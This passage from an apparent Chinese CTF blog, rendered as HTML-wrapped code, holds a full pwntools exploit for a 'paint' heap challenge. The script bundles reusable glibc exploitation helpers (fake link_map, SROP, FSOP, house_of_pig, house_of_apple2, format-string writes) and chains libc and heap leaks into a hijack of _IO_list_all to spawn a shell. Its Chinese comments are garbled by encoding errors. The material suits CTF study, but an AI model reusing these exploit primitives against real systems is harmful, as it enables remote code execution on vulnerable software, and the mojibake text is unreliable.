class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import ctypes</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;paint-71ae86dc10a3fe17.brics-ctf.ru&quot;</span></span><br><span class="line">remote_port = <span class="string">&quot;13003&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">mode = 1</span><br><span class="line"></span><br><span class="line">s = lambda x: p.send(x)</span><br><span class="line">r = lambda x: p.recv(x)</span><br><span class="line">ra = lambda: p.recvall()</span><br><span class="line">rl = lambda: p.recvline(keepends=True)</span><br><span class="line">ru = lambda x: p.recvuntil(x)</span><br><span class="line">sl = lambda x: p.sendline(x)</span><br><span class="line">sa = lambda x, y: p.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = lambda: p.interactive()</span><br><span class="line">c = lambda: p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line">    p = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename, stdin=PTY)</span><br><span class="line"></span><br><span class="line">def bpp():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def <span class="built_in">log</span>(x):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\x1B[36m&#123;&#125;\x1B[0m&quot;</span>.format(x))</span><br><span class="line"></span><br><span class="line">def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset): <span class="comment"># fake_linkmap_addræŒ‡å‘ä¸€æ®µå¯æ§å†…å­˜ | known_func_ptræŒ‡å‘ä¸€ä¸ªå·²çŸ¥çš„å‡½æ•°çš„gotè¡¨åœ°å€ | offsetæ˜¯systemå‡½æ•°å’Œè¿™ä¸ªå‡½æ•°åœ¨libcä¸Šçš„åç§»</span></span><br><span class="line">    <span class="comment"># &amp;(2**64-1)æ˜¯å› ä¸ºoffseté€šå¸¸ä¸ºè´Ÿæ•°ï¼Œå¦‚æœä¸æ§åˆ¶èŒƒå›´ï¼Œp64åä¼šè¶Šç•Œï¼Œå‘ç”Ÿé”™è¯¯</span></span><br><span class="line">    linkmap = p64(offset &amp; (2 ** 64 - 1)) <span class="comment">#l_addr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 8ï¼Œä¹Ÿå°±æ˜¯DT_JMPRELï¼Œè‡³äºä¸ºä»€ä¹ˆæœ‰ä¸ª0ï¼Œå¯ä»¥å‚è€ƒIDAä¸Š.dyamiscçš„ç»“æ„å†…å®¹</span></span><br><span class="line">    linkmap += p64(0) <span class="comment"># å¯ä»¥ä¸ºä»»æ„å€¼</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + 0x18) <span class="comment"># è¿™é‡Œçš„å€¼å°±æ˜¯ä¼ªé€ çš„.rel.pltçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 0x18,fake_rel_write,å› ä¸ºwriteå‡½æ•°pushçš„ç´¢å¼•æ˜¯0ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€é¡¹</span></span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0</span>x30 - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) <span class="comment"># Rela-&gt;r_offset,æ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œåº”è¯¥å­˜çš„æ˜¯gotè¡¨å¯¹åº”æ¡ç›®çš„åœ°å€ï¼Œè§£æå®Œæˆååœ¨è¿™ä¸ªåœ°å€ä¸Šå­˜æ”¾å‡½æ•°çš„å®é™…åœ°å€ï¼Œæ­¤å¤„æˆ‘ä»¬åªéœ€è¦è®¾ç½®ä¸€ä¸ªå¯è¯»å†™çš„åœ°å€å³å¯ </span></span><br><span class="line">    linkmap += p64(0x7) <span class="comment"># Rela-&gt;r_info,ç”¨äºç´¢å¼•symtabä¸Šçš„å¯¹åº”é¡¹ï¼Œ7&gt;&gt;32=0ï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘symtabçš„ç¬¬ä¸€é¡¹</span></span><br><span class="line">    linkmap += p64(0)<span class="comment"># Rela-&gt;r_addend,ä»»æ„å€¼éƒ½è¡Œ</span></span><br><span class="line"></span><br><span class="line">    linkmap += p64(0)<span class="comment">#l_ns</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 0x38, DT_SYMTAB </span></span><br><span class="line">    linkmap += p64(0) <span class="comment"># å‚è€ƒIDAä¸Š.dyamiscçš„ç»“æ„</span></span><br><span class="line">    linkmap += p64(known_func_ptr - 0x8) <span class="comment"># è¿™é‡Œçš„å€¼å°±æ˜¯ä¼ªé€ çš„symtabçš„åœ°å€,ä¸ºå·²è§£æå‡½æ•°çš„gotè¡¨åœ°å€-0x8</span></span><br><span class="line"></span><br><span class="line">    linkmap += b<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(0x68,b<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) <span class="comment"># fake_linkmap_addr + 0x68, å¯¹åº”çš„å€¼çš„æ˜¯DT_STRTABçš„åœ°å€ï¼Œç”±äºæˆ‘ä»¬ç”¨ä¸åˆ°strtabï¼Œæ‰€ä»¥éšæ„è®¾ç½®äº†ä¸€ä¸ªå¯è¯»åŒºåŸŸ</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + 0x38) <span class="comment"># fake_linkmap_addr + 0x70 , å¯¹åº”çš„å€¼æ˜¯DT_SYMTABçš„åœ°å€</span></span><br><span class="line">    linkmap = linkmap.ljust(0xf8,b<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + 0x8) <span class="comment"># fake_linkmap_addr + 0xf8, å¯¹åº”çš„å€¼æ˜¯DT_JMPRELçš„åœ°å€</span></span><br><span class="line">    <span class="built_in">return</span> linkmap</span><br><span class="line"></span><br><span class="line">def orw_shellcode():</span><br><span class="line">    payload=shellcraft.open(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">    payload+=shellcraft.read(3,<span class="string">&#x27;./flag&#x27;</span>,100)</span><br><span class="line">    payload+=shellcraft.write(1,<span class="string">&#x27;./flag&#x27;</span>,100)</span><br><span class="line">    payload=asm(payload)</span><br><span class="line">    <span class="built_in">return</span> payload</span><br><span class="line"></span><br><span class="line">def csu_gadget(part1, part2, jmp2, arg1 = 0, arg2 = 0, arg3 = 0): <span class="comment"># -&gt;å¯èƒ½éœ€è¦å…·ä½“é—®é¢˜å…·ä½“åˆ†æ</span></span><br><span class="line">    payload = p64(part1)    <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">    payload += p64(0)    <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(1)    <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += p64(part2)    <span class="comment"># part2 entry will call [r12 + rbx * 0x8]</span></span><br><span class="line">    payload += b<span class="string">&#x27;A&#x27;</span> * 56    <span class="comment"># junk 6 * 8 + 8 = 56</span></span><br><span class="line">    <span class="built_in">return</span> payload</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">    leak_dat = ru(<span class="string">&quot;\x7f&quot;</span>)[-6:]</span><br><span class="line">    <span class="built_in">return</span> u64(leak_dat.ljust(8, b<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">def fmlstr(offset1, offset2, chain2, target, prefix): <span class="comment"># partial write</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(8):</span><br><span class="line">        <span class="keyword">if</span> (target&amp;0xff) != 0:</span><br><span class="line">            <span class="keyword">if</span> i != 0:</span><br><span class="line">                sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;<span class="variable">$hhn</span>&quot;</span>.format(((chain2&amp;<span class="number">0</span>xff) + i), offset1).encode() + b&#x27;\x00&#x27;)</span><br><span class="line">                sleep(<span class="number">0.05</span>)</span><br><span class="line">            sa(prefix, &quot;%&#123;&#125;c%&#123;&#125;<span class="variable">$hhn</span>&quot;.format((target&amp;<span class="number">0</span>xff), offset2).encode() + b&#x27;\x00&#x27;)</span><br><span class="line">            sleep(<span class="number">0.05</span>)</span><br><span class="line">            target &gt;&gt;= <span class="number">8</span></span><br><span class="line">    sa(prefix, &quot;%&#123;&#125;c%<span class="number">8</span><span class="variable">$hhn</span>&quot;.format((chain2&amp;<span class="number">0</span>xff)).encode() + b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def fmlstr2(offset1, offset2, chain2, target, prefix): <span class="comment"># partial write</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(4):</span><br><span class="line">        <span class="keyword">if</span> (target&amp;0xffff) != 0:</span><br><span class="line">            <span class="keyword">if</span> i != 0:</span><br><span class="line">                sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;<span class="variable">$hhn</span>&quot;</span>.format(((chain2&amp;<span class="number">0</span>xff) + i*<span class="number">2</span>), offset1).encode() + b&#x27;\x00&#x27;)</span><br><span class="line">                sleep(<span class="number">0.05</span>)</span><br><span class="line">            sa(prefix, &quot;%&#123;&#125;c%&#123;&#125;<span class="variable">$hn</span>&quot;.format((target&amp;<span class="number">0</span>xffff), offset2).encode() + b&#x27;\x00&#x27;)</span><br><span class="line">            sleep(<span class="number">0.05</span>)</span><br><span class="line">            target &gt;&gt;= <span class="number">16</span></span><br><span class="line">    sa(prefix, &quot;%&#123;&#125;c%<span class="number">8</span><span class="variable">$hhn</span>&quot;.format((chain2&amp;<span class="number">0</span>xff)).encode() + b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def SROP(rdi, rsp, rip):</span><br><span class="line">    signframe = SigreturnFrame()</span><br><span class="line">    signframe.rax = constants.SYS_execve</span><br><span class="line">    signframe.rdi = rdi</span><br><span class="line">    signframe.rsi = 0x0</span><br><span class="line">    signframe.rdx = 0x0</span><br><span class="line">    signframe.rsp = rsp</span><br><span class="line">    signframe.rip = rip</span><br><span class="line">    <span class="built_in">return</span> bytes(signframe)</span><br><span class="line"></span><br><span class="line">def FSOP(fake_vtable_addr):</span><br><span class="line">    <span class="comment"># only in glibc 2.23 </span></span><br><span class="line">    <span class="comment"># 2.23+ vtableæœ‰èŒƒå›´æ ¡éªŒ æ­¤æ—¶ä¸å¦‚åˆ«çš„æ‰“æ³•å¥½æ‰“</span></span><br><span class="line">    <span class="comment"># è§¦å‘æ–¹å¼åªè¦èƒ½å‡ºå‘_IO_overflowå³å¯(å…¶å®æœ‰å…³IOæµçš„åªè¦ç»è¿‡vtableåº”è¯¥éƒ½èƒ½æ‰“)</span></span><br><span class="line">    from pwncli import IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE._mode = 0</span><br><span class="line">    fake_IO_FILE._IO_write_ptr = 1</span><br><span class="line">    fake_IO_FILE._IO_write_base = 0</span><br><span class="line">    fake_IO_FILE.flags = 0x68732f6e69622f <span class="comment"># /bin/sh\x00</span></span><br><span class="line">    fake_IO_FILE.vtable = fake_vtable_addr</span><br><span class="line">    IO_FILE = bytes(fake_IO_FILE)</span><br><span class="line">    <span class="built_in">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line">def house_of_pig(_IO_str_jumps, bin_addr, bin_size, system_addr):</span><br><span class="line">    <span class="comment"># 2.34ä¹‹å‰ä»èƒ½ç”¨house_of_pigæ‰“ï¼Œ2.34ä¹‹åå„ç§hookå‡½æ•°è¢«å¼„æ‰äº† ä¸è¿‡å¯ä»¥çœ‹çœ‹house_of_pig_plus</span></span><br><span class="line">    <span class="comment"># åŸç†ï¼šåªè¦èƒ½è·‘åˆ°_IO_oveflowå°±ä¼šè·³è½¬åˆ°_IO_str_overflowç„¶åå°±ä¼šmalloc-&gt;memcpy-&gt;free  /||gadget</span></span><br><span class="line">    <span class="comment"># å°½é‡ç”³è¯·free_hook - 0x20ç„¶ååˆ©ç”¨_IO_save_base + _IO_backup_baseæ¥å¤„ç†memcpyé‚£éƒ¨åˆ†</span></span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="string">    char *old_buf = fp-&gt;_IO_buf_base; # éœ€è¦æ§åˆ¶_IO_buf_base </span></span><br><span class="line"><span class="string">	size_t old_blen = _IO_blen (fp);</span></span><br><span class="line"><span class="string">	size_t new_size = 2 * old_blen + 100;</span></span><br><span class="line"><span class="string">    new_buf = malloc (new_size); # è®¡ç®—å¥½ç”³è¯·å‡ºæ¥</span></span><br><span class="line"><span class="string">    memcpy (new_buf, old_buf, old_blen); #è¦†ç›–(</span></span><br><span class="line"><span class="string">	free (old_buf);</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    from pwncli import IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE._mode = 0</span><br><span class="line">    fake_IO_FILE._IO_write_ptr = 1</span><br><span class="line">    fake_IO_FILE._IO_write_base = 0</span><br><span class="line">    fake_IO_FILE.vtable = _IO_str_jumps</span><br><span class="line">    fake_IO_FILE._IO_buf_base = bin_addr</span><br><span class="line">    fake_IO_FILE._IO_buf_end = bin_addr + int((bin_size - <span class="number">100</span>) / <span class="number">2</span>)</span><br><span class="line">    fake_IO_FILE._IO_save_base = system_addr</span><br><span class="line">    fake_IO_FILE._IO_backup_base = system_addr</span><br><span class="line">    return bytes(fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">def house_of_apple2(_IO_wfile_jumps, wide_data_entry, wide_data_vtable_entry, RIP):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    è°ƒç”¨æµä¸º_IO_wfile_overflow-&gt;_IO_wdoallocbuf-&gt;_IO_WDOALLOCATE-&gt;Your RIP</span><br><span class="line">    _flagsè®¾ç½®ä¸º~(<span class="number">2</span> | <span class="number">0</span>x8 | <span class="number">0</span>x800)ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶rdiï¼Œè®¾ç½®ä¸º<span class="number">0</span>å³å¯ï¼›å¦‚æœéœ€è¦è·å¾—shellï¼Œå¯è®¾ç½®ä¸º  sh;ï¼Œæ³¨æ„å‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # main</span><br><span class="line">    from pwncli import IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE.flags = <span class="number">0</span>x68732020</span><br><span class="line">    fake_IO_FILE._mode = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_IO_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE.vtable = _IO_wfile_jumps</span><br><span class="line">    fake_IO_FILE._wide_data = wide_data_entry</span><br><span class="line">    fake_IO_FILE = bytes(fake_IO_FILE)</span><br><span class="line">    # wide_data è¿™é‡Œåªè¦æ§åˆ¶vtableå³å¯</span><br><span class="line">    pad = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(heap_base + <span class="number">0</span>x100) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) * (<span class="number">28</span>-<span class="number">7</span>)</span><br><span class="line">    pad += p64(wide_data_vtable_entry)</span><br><span class="line">    # wide_data_vtable</span><br><span class="line">    &quot;&quot;&quot;_wide_data-&gt;_wide_vtable-&gt;doallocateè®¾ç½®ä¸ºåœ°å€Cç”¨äºåŠ«æŒRIPï¼Œå³æ»¡è¶³(B + <span class="number">0</span>x68) = C&quot;&quot;&quot;</span><br><span class="line">    payload = p64(RIP)*<span class="number">14</span></span><br><span class="line">    return (fake_IO_FILE, pad, payload)</span><br><span class="line"></span><br><span class="line">prefix = &quot;<span class="number">6</span>. Delete canvas&quot;</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(prefix, b&#x27;<span class="number">4</span>&#x27;)</span><br><span class="line">    sla(&quot;Enter idx: &quot;, str(index))</span><br><span class="line"></span><br><span class="line">def add(index, width, height):</span><br><span class="line">    sla(prefix, b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, str(index))</span><br><span class="line">    sla(<span class="string">&quot;Enter canvas width (1-255): &quot;</span>, str(width))</span><br><span class="line">    sla(<span class="string">&quot;Enter canvas height (1-255): &quot;</span>, str(height))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    sla(prefix, b<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, str(index))</span><br><span class="line"></span><br><span class="line">def edit(index, payload):</span><br><span class="line">    sla(prefix, b<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, str(index))</span><br><span class="line">    sa(<span class="string">&quot;Enter your picture (`width` chars in `height` lines): &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">def rate(index, rate, comment, payload):</span><br><span class="line">    sla(prefix, b<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, str(index))</span><br><span class="line">    sla(<span class="string">&quot;Enter rate: &quot;</span>, str(rate))</span><br><span class="line">    sla(<span class="string">&quot;Leave comment (y/n): &quot;</span>, comment)</span><br><span class="line">    sa(<span class="string">&quot;Enter your comment: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">def resize(index, width, height):</span><br><span class="line">    sla(prefix, b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter idx: &quot;</span>, str(index))</span><br><span class="line">    sla(<span class="string">&quot;Enter new width (1-255): &quot;</span>, str(width))</span><br><span class="line">    sla(<span class="string">&quot;Enter new height (1-255): &quot;</span>, str(height))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">exit</span>():</span><br><span class="line">    sla(prefix, b<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;leak libc&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">show(-2)</span><br><span class="line"></span><br><span class="line">leak_dat = leak()</span><br><span class="line"><span class="built_in">log</span>(hex(leak_dat))</span><br><span class="line"></span><br><span class="line">libc_base = leak_dat - (0x7f510501ba80 - 0x7f5104e00000)</span><br><span class="line"><span class="built_in">log</span>(hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;leak heap&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">add(0, 0x10, 2)</span><br><span class="line">rate(0, 1, <span class="string">&#x27;y&#x27;</span>, b<span class="string">&#x27;a&#x27;</span>*0x20)</span><br><span class="line">rate(0, 1, <span class="string">&#x27;y&#x27;</span>, b<span class="string">&#x27;b&#x27;</span>*0x30)</span><br><span class="line">delete(0)</span><br><span class="line">add(0, 0x10, 2)</span><br><span class="line">show(0)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Picture: \n&quot;</span>)</span><br><span class="line">heap_base = u64(r(5).ljust(8, b<span class="string">&#x27;\x00&#x27;</span>)) <span class="comment"># L &gt;&gt; 12 è¡¥å›å»åˆšå¥½æ˜¯heap_base</span></span><br><span class="line">heap_base = heap_base &lt;&lt; <span class="string">12</span></span><br><span class="line"><span class="string">log(hex(heap_base &lt;&lt; 12</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;house of apple 2&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">wide_data_entry = heap_base + 0x500</span><br><span class="line">wide_data_vtable_entry = heap_base + 0x640</span><br><span class="line"></span><br><span class="line">payloads = house_of_apple2(_IO_wfile_jumps, wide_data_entry, wide_data_vtable_entry, libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;wide_data / vtable&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">rate(-8, 1, <span class="string">&#x27;y&#x27;</span>, p64(0xffffffffffff01ff) + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line">edit(-5, p64(heap_base + 0x3c0)) <span class="comment"># _IO_list_all</span></span><br><span class="line"></span><br><span class="line">add(3, 0xff, 1)</span><br><span class="line">edit(3, payloads[0])</span><br><span class="line"></span><br><span class="line">add(4, 0xff, 1)</span><br><span class="line">edit(4, payloads[1])</span><br><span class="line"></span><br><span class="line">add(5, 0xff, 1)</span><br><span class="line">edit(5, payloads[2])</span><br><span class="line"><span class="comment"># bpp()</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;past&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/24/catctf-injection2-0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbinçš„å°åšå®¢~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/24/catctf-injection2-0/" class="post-title-link" itemprop="url">catctf injection2.0</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-09-24 13:26:08" itemprop="dateCreated datePublished" datetime="2023-09-24T13:26:08+08:00">2023-09-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-09-25 20:23:33" itemprop="dateModified" datetime="2023-09-25T20:23:33+08:00">2023-09-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
                  ï¼Œ
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/kernel/" itemprop="url" rel="index"><span itemprop="name">kernel</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>289</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>è¿™æ˜¯ä¸€ç§æ¯”è¾ƒå¥½ç©çš„é¢˜</p>
<p>æ¼æ´åœ¨è¿™é‡Œ initæ–‡ä»¶</p>
